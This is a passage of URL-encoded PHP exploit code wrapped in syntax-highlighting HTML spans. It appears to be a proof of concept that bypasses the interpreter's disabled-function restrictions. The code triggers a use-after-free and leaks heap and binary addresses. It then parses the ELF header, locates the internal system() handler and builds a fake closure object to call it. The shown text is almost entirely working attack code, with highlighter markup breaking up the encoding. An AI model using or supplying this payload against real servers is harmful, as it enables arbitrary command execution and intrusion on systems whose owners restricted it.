class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>start<span class="hljs-variable">%20</span>-<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">1000</span><span class="hljs-variable">%20</span>*<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%207</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10102464</span><span class="hljs-keyword">c</span><span class="hljs-number">457</span>f)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>get_system(<span class="hljs-variable">%24</span>basic_funcs)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>basic_funcs<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>do<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f_entry<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f_name<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>f_entry<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%206</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>f_name<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">6</span>d<span class="hljs-number">6574737973</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>while(<span class="hljs-variable">%24</span>f_entry<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>trigger_uaf(<span class="hljs-variable">%24</span>arg)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>arg<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str_shuffle(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>vuln<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>vuln()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>vuln-<span class="hljs-variable">%3</span>ea<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>arg<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(stristr(php_os<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>&#x27;win&#x27;))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(&#x27;this<span class="hljs-variable">%20</span>poc<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>for<span class="hljs-variable">%20</span>*nix<span class="hljs-variable">%20</span>systems<span class="hljs-variable">%20</span>only.&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n_alloc<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%2010</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>contiguous<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n_alloc<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>contiguous<span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str_shuffle(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>trigger_uaf(&#x27;<span class="hljs-keyword">x</span>&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%5</span>b<span class="hljs-number">1</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%5</span>b&#x27;args&#x27;<span class="hljs-variable">%5</span>d<span class="hljs-variable">%5</span>b<span class="hljs-number">0</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>helper<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper-<span class="hljs-variable">%3</span>eb<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span><span class="hljs-keyword">x</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(strlen(<span class="hljs-variable">%24</span>abc)<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%2079</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>strlen(<span class="hljs-variable">%24</span>abc)<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>uaf<span class="hljs-variable">%20</span>failed<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>closure_handlers<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str<span class="hljs-number">2</span>ptr(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>php_heap<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str<span class="hljs-number">2</span>ptr(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">58</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>php_heap<span class="hljs-variable">%20</span>-<span class="hljs-variable">%200</span>xc<span class="hljs-number">8</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">60</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">70</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%206</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">60</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>xa)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>closure_obj<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str<span class="hljs-number">2</span>ptr(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>binary_leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>closure_handlers<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>get_binary_base(<span class="hljs-variable">%24</span>binary_leak)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>determine<span class="hljs-variable">%20</span>binary<span class="hljs-variable">%20</span>base<span class="hljs-variable">%20</span>address<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>elf<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>parse_elf(<span class="hljs-variable">%24</span>base)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>parse<span class="hljs-variable">%20</span>elf<span class="hljs-variable">%20</span>header<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>basic_funcs<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>get_basic_funcs(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>elf)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>get<span class="hljs-variable">%20</span>basic_functions<span class="hljs-variable">%20</span>address<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>zif_system<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>get_system(<span class="hljs-variable">%24</span>basic_funcs)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>get<span class="hljs-variable">%20</span>zif_system<span class="hljs-variable">%20</span>address<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>fake_obj_offset<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span>xd<span class="hljs-number">0</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">110</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>fake_obj_offset<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>closure_obj<span class="hljs-variable">%2</span><span 